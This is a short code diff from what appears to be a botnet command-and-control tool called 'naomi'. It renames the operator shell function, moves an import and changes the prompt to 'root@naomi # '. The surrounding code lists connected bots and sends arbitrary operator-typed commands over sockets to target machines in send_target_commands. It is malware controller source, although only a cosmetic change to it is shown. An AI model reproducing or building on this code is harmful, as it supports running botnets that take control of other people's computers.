@@ -1,13 +1,14 @@
 from data.state import naomi
+from shell.cli import banner
+
 from network.socket.connections import refresh_connections
 
-def start_shell():
-    from interface.cli import banner
+def shell():
     print(banner)
     while True:
-        cmd = input("naomi> ")
+        cmd = input("root@naomi # ")
         if cmd == "":
-            cmd = input("naomi> ")
+            cmd = input("root@naomi # ")
         if cmd == "bot list":
             conn = refresh_connections()
             print(f"Connected Bots: {conn}")
@@ -40,8 +41,6 @@ def send_target_commands(connection):
 
             if cmd == "exit":
                 break
-
-
             # use str.encode to convert string to bytes
             if len(str.encode(cmd)) > 0: # check if command is not null
                 connection.send(str.encode(cmd))
